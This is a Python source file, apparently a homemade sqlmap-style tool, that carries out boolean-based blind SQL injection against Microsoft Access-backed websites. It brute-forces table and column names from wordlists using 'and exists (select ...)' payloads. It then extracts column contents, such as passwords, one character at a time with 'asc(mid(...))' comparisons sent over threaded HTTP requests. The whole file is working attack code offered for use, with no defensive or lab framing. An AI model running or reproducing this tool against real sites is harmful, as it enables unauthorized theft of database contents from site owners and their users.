__author__ = "AdminTony"

import re, requests, optparse, sys, threading

# sql_injection -u url --tables --keyword=jkljkl
# -u url -T table_name --columns
# -u url -T table_name -C column_name --dump

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
}
table_list = []
column_list = []
data_dir = {}


def Generator_table():
    for table_name in open("table.txt", "r+"):
        if table_name != "":
            yield table_name.split('\n')[0]
    return


def Generator_column():
    for column_name in open("column.txt", "r+"):
        if column_name != "":
            yield column_name.split('\n')[0]
    return


tablegen = Generator_table()


# 注入表名
def test_tables(url_, keyword):
    while True:
        # 取出table_name来进行注入，当生成器中的table_name全部被取出时结束循环
        try:
            table_name = tablegen.__next__()
            # print(table_name)
        except:
            break
        # and exists (select * from 表名)
        payload = "and exists (select * from " + table_name + ")"
        url = url_
        # 指定注入语句填写的位置
        if '*' in url:
            url = url.replace('*', payload)
        # 填写在末尾
        else:
            url = url + payload
        # print(url)
        res = requests.get(url, headers=headers)
        # print(res.text)
        if keyword in res.text:
            print("[+] Exit table : %s" % table_name)
            global table_list
            table_list.append(table_name)
        else:
            print("[-] Testing table : %s" % table_name)


columngen = Generator_column()


# 注入列名
def test_columns(url_, table_name, keyword):
    while True:
        # 取出column_name来进行注入，当生成器中的column_name全部被取出时结束循环
        try:
            column_name = columngen.__next__()
        except:
            break
        # and exists (select 列名 from 表名)
        payload = "and exists (select " + column_name + " from " + table_name + ")"
        url = url_
        # 指定注入语句填写的位置
        if '*' in url:
            url = url.replace('*', payload)
        # 填写在末尾
        else:
            url = url + payload
        res = requests.get(url, headers=headers)
        if keyword in res.text:
            print("[+] Exit column : %s" % column_name)
            global column_list
            column_list.append(column_name)
        else:
            print("[-] Testing column : %s" % column_name)


class Dump(object):
    def __init__(self,url,table_name,column_name,keyword):
        self.url = url
        self.char_list=[i for i in range(32,128)]
        self.table_name = table_name
        self.column_name = column_name
        self.keyword = keyword
    #获取列名数量
    #由于access不支持limit，这里还不知道用什么方法来代替limit

    #获取数据的长度：

    def len_data(self):
        #and (select top 1 len(列名) from 表名)>=5
        n = 0
        while True:
            payload="and (select top 1 len(%s) from %s)=%s"\
                    %(self.column_name,self.table_name,n)
            url = self.url
            # 指定注入语句填写的位置
            if '*' in url:
                url = url.replace('*', payload)
            # 填写在末尾
            else:
                url = url + payload
            res = requests.get(url,headers=headers)
            if self.keyword in res.text:
                break
            n+=1
        return n
    # 注入数据
    def dump_data(self):
        data = ""
        len = self.len_data()
        print("[+] The Length of %s is %s !"%(self.column_name,len))
        print("[+] Dump data please waiting !")
        for i in range(1,len+1):
            #and (select top 1 asc(mid(password, 1, 1)) from 表) >= 结果
            j = 0
            while True:
                try:
                    char=self.char_list[j]
                except:
                    break
                payload = "and (select top 1 asc(mid(%s,%s,1)) from %s) =%s"\
                          %(self.column_name,i,self.table_name,char)
                url = self.url
                # 指定注入语句填写的位置
                if '*' in url:
                    url = url.replace('*', payload)
                # 填写在末尾
                else:
                    url = url + payload
                try:
                    print(url)
                    res = requests.get(url,headers=headers,timeout=10)
                    if self.keyword in res.text:
                        #sys.stdout.write(chr(char))
                        data=data+chr(char)
                        break
                    j+=1
                except:
                    pass
        global data_dir
        data_dir[self.column_name]=data
        '''
        print("[+] Table : %s "%self.table_name)
        print("    [+]Column : %s"%self.column_name)
        print("        [+]data : %s"%data)
        '''

def run_col(url,table,column,keyword):
    dump = Dump(url,table,column,keyword)
    dump.dump_data()

def main():
    moudle = 9999

    opt = optparse.OptionParser()
    opt.usage = "[+] Please use %prog -h see help!"
    opt.add_option("-u", "--url", action="store", type="string", dest="url",
                   help="[+] The Target URL of injection !")
    opt.add_option("--tables", action="store_true", dest="tables",
                   default="false",
                   help="[+] Injection tables")
    opt.add_option("-T", action="store", dest="table_name",
                   help="[+] The table_name you want injection!")
    opt.add_option("--columns", action="store_true", dest="columns",
                   default="false",
                   help="[+] Injection columns of -T table_name")
    opt.add_option("-C", action="store", dest="column_name",
                   help="[+] The columns_name you want injection! spilt with ,")
    opt.add_option("--dump", action="store_true", dest="dump",
                   help="[+] Dump the data form columns")
    opt.add_option("--keyword", action="store", dest="keyword",
                   help="[+] The keyword of true page !")
    opt.add_option("-t", "--thread", action="store", dest="thread_num",
                   default="10", type="int", help="[+] The number of thread! DEFAULT=10 !")
    (options, args) = opt.parse_args()

    if len(sys.argv) < 5:
        opt.print_usage()
        sys.exit()

    if not options.url:
        print("[-] Invalid URL !")
        sys.exit()

    if not options.keyword:
        print("[-] Please input the keyword of true page !")
        sys.exit()

    # 注入表名
    if options.tables == True:
        moudle = 1
        # print("moudle1")
    # 注入列名
    # print(options.columns,"  ",moudle)
    if options.columns == True:
        # print("why?")
        moudle = 2
    # 注入数据
    if options.dump:
        moudle = 3

    # print(options.columns,"  ",moudle)
    # 注入表
    if moudle == 1:
        threads = []
        for i in range(options.thread_num):
            thread = threading.Thread(target=test_tables,
                                      args=(options.url, options.keyword))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        print("\n[+] Table_name : ")
        table_set = set(table_list)
        for table in table_set:
            print("[+] %s" % table)
    # 注入列
    elif moudle == 2:
        threads = []
        for i in range(options.thread_num):
            thread = threading.Thread(target=test_columns,
                                      args=(options.url, options.table_name, options.keyword))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        print("\n[+] Column Name : ")
        column_set = set(column_list)
        for column in column_set:
            print("[+] %s" % column)
    # 注入数据
    elif moudle == 3:
        threads=[]
        col_list = options.column_name.split(",")
        for col in col_list:
            thread = threading.Thread(target=run_col,args=(options.url,options.table_name,col,
                options.keyword))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

        print("[+] Table : %s "%options.table_name)
        print("    [+]Column : %s"%options.column_name)
        sys.stdout.write("        [+]data : ")
        for col in col_list:
            sys.stdout.write(data_dir[col]+"|")


    else:
        sys.exit()


if __name__ == "__main__":
    main()
